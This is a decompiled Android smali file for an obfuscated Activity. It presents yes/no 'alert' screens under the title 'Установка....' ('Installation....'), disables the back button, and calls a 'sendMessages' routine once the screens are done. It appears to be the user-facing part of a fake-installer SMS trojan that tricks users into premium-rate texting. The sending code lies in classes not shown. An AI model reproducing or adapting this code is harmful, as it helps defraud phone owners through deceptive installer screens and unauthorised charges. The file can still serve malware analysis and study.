.class public Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;
.super Landroid/app/Activity;
.source "aXupoWBrj.java"


# instance fields
.field private buttonNo:Landroid/widget/Button;

.field private buttonYes:Landroid/widget/Button;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static checkNextQuestions(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 3

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->getCurrentAlertID()I

    move-result v1

    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void

    :cond_0
    invoke-static {p0, p1}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->sendMessages(Landroid/content/Context;Landroid/app/Activity;)V

    goto :goto_0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7

    const-string v3, "log"

    const-string v4, "QuestionActivity onCreate"

    invoke-static {v3, v4}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v3, 0x7f030003

    invoke-virtual {p0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->setContentView(I)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

    move-result-object v3

    invoke-virtual {v3, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->init(Landroid/content/Context;)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v3

    invoke-virtual {v3, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->init(Landroid/content/Context;)V

    const v3, 0x7f070013

    invoke-virtual {p0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Button;

    iput-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonYes:Landroid/widget/Button;

    const v3, 0x7f070012

    invoke-virtual {p0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Button;

    iput-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonNo:Landroid/widget/Button;

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonYes:Landroid/widget/Button;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v4

    invoke-virtual {v4}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v4

    const-string v5, "ui.alertscreen.buttons.yes.caption"

    iget-object v6, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonYes:Landroid/widget/Button;

    invoke-virtual {v6}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonNo:Landroid/widget/Button;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v4

    invoke-virtual {v4}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v4

    const-string v5, "ui.alertscreen.buttons.no.caption"

    iget-object v6, p0, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->buttonNo:Landroid/widget/Button;

    invoke-virtual {v6}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    const v3, 0x7f070010

    invoke-virtual {p0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->getCurrentAlertID()I

    move-result v0

    const/4 v3, -0x1

    if-eq v0, v3, :cond_0

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v3

    invoke-virtual {v3}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v3

    invoke-virtual {v3}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    move-result-object v3

    invoke-virtual {v3, v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getAlert(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    new-instance v3, Landroid/text/method/ScrollingMovementMethod;

    invoke-direct {v3}, Landroid/text/method/ScrollingMovementMethod;-><init>()V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setMovementMethod(Landroid/text/method/MovementMethod;)V

    const-string v3, "\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430...."

    invoke-virtual {p0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->setTitle(Ljava/lang/CharSequence;)V

    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 v0, 0x4

    if-ne p1, v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method public onNoClicked(Landroid/view/View;)V
    .locals 3

    const/4 v2, 0x0

    const-string v0, "log"

    const-string v1, "Exit"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    move-result-object v0

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->getCurrentAlertID()I

    move-result v1

    invoke-virtual {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->setAlertResult(IZ)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->increaseCurrentAlertID()V

    invoke-virtual {p0, p1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->startNextQuestion(Landroid/view/View;Z)V

    invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->finish()V

    return-void
.end method

.method public onYesClicked(Landroid/view/View;)V
    .locals 3

    const/4 v2, 0x1

    const-string v0, "log"

    const-string v1, "Next"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/a24f48d52;->getInternals()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;

    move-result-object v0

    invoke-virtual {v0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSmsInfo()Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    move-result-object v0

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->getCurrentAlertID()I

    move-result v1

    invoke-virtual {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->setAlertResult(IZ)V

    invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a689b9482;->increaseCurrentAlertID()V

    invoke-virtual {p0, p1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->startNextQuestion(Landroid/view/View;Z)V

    invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->finish()V

    return-void
.end method

.method public startNextQuestion(Landroid/view/View;Z)V
    .locals 1

    if-eqz p2, :cond_0

    :cond_0
    invoke-virtual {p1}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p0}, Lcom/adc58a797/ac31b3236/a740675ee/a8a5c951b;->checkNextQuestions(Landroid/content/Context;Landroid/app/Activity;)V

    return-void
.end method
